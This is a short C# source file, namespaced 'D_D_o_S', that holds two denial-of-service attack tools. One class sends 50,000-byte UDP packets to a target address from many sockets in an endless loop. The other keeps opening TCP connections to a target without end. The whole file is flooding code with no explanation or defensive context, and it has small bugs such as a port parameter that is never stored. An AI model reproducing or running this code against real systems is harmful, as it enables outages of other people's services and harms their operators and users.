using System.Net;
using System.Net.Sockets;
using System.Threading;







namespace D_D_o_S
{
    public class udpFlood
    {
        UdpClient[] c;
        Thread t;
        int guys;
        IPAddress target;
        int port;
        public udpFlood(int guy, string ipa, int port)
        {
            target = IPAddress.Parse(ipa);
            port = this.port;
            guys = guy;
            c = new UdpClient[guys];
            for (int i = 0; i != guys; )
            {

                c[i++] = new UdpClient(target.ToString(), port);






            }
            t = new Thread(new ThreadStart(atk));
            t.Start();







        }
        void atk()
        {
            byte[] msg = new byte[50000];
            do
            {
                for (int i = 0; i != guys; )
                {


                    try
                    {
                        c[i++].Send(msg, 50000);
                    }
                    catch { }
                }




            } while (true);
            atk();
        }





    }
    public class Atkr
    {
        TcpClient tc;
        Thread t;
        IPAddress ip;
        int port;
        public Atkr(string ipa, int Port)
        {
            port = Port;
            ip = IPAddress.Parse(ipa);
            t = new Thread(new ThreadStart(atk));
            t.Start();
        }
        void atk()
        {
            try
            {
                tc = new TcpClient(ip.ToString(), port);
            }
            catch
            { }
            do
            {
                try
                {
                    //tc.Close();
                    tc = new TcpClient(ip.ToString(), port);

                }
                catch { }
            } while (true);

        }








    }






}